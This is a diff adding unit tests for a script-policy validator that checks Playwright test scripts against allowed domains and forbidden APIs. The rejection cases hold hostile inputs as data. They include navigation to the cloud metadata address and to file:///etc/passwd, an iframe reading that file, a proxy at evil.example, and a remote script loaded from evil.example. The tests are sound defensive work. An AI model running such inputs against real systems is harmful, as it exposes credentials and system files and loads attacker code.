@@ -128,3 +128,53 @@ describe('countAssertions', () => {
     expect(countAssertions(`test('x', async () => {});`)).toBe(0);
   });
 });
+
+describe('checkScriptPolicy con dominios permitidos', () => {
+  const allowedDomains = ['saucedemo.com'];
+  const navigation = (body: string) => {
+    const result = checkScriptPolicy(withBody(body), { allowedDomains });
+    return result.ok ? [] : result.violations;
+  };
+
+  it('acepta el dominio permitido y sus subdominios', () => {
+    expect(checkScriptPolicy(validScript, { allowedDomains })).toEqual({ ok: true });
+    expect(navigation(`await page.goto('https://saucedemo.com/inventory.html');`)).toEqual([]);
+  });
+
+  it.each([
+    ['otro dominio', `await page.goto('https://example.com');`, 'no está en la lista'],
+    ['un dominio que solo lo contiene', `await page.goto('https://evilsaucedemo.com');`, 'no está'],
+    ['una IP', `await page.goto('http://169.254.169.254/latest');`, 'no está en la lista'],
+    ['file://', `await page.goto('file:///etc/passwd');`, 'solo admite URLs http'],
+    ['una URL relativa', `await page.goto('/inventory.html');`, 'URL absoluta'],
+    [
+      'una URL construida',
+      "const host = 'example.com'; await page.goto(`https://${host}`);",
+      'literal',
+    ],
+    [
+      'una URL en variable',
+      `const url = 'https://saucedemo.com'; await page.goto(url);`,
+      'literal',
+    ],
+  ])('rechaza navegar a %s', (_name, body, message) => {
+    expect(navigation(body)).toEqual([expect.stringContaining(message)]);
+  });
+
+  it('exige URLs literales http(s) aunque se permita cualquier dominio', () => {
+    expect(violationsOf(withBody(`await page.goto('file:///etc/passwd');`))).toEqual([
+      expect.stringContaining('solo admite URLs http'),
+    ]);
+    expect(violationsOf(withBody(`await page.goto('https://example.com');`))).toEqual([]);
+  });
+
+  it.each([
+    ['test.use', `test.use({ proxy: { server: 'http://evil.example' } });`],
+    ['test.extend', `const t = test.extend({});`],
+    ['el fixture browser', `const ctx = await page.context().browser().newContext();`],
+    ['setContent', `await page.setContent('<iframe src="file:///etc/passwd"></iframe>');`],
+    ['addScriptTag', `await page.addScriptTag({ url: 'https://evil.example/x.js' });`],
+  ])('rechaza %s', (_name, body) => {
+    expect(violationsOf(withBody(body)).length).toBeGreaterThan(0);
+  });
+});
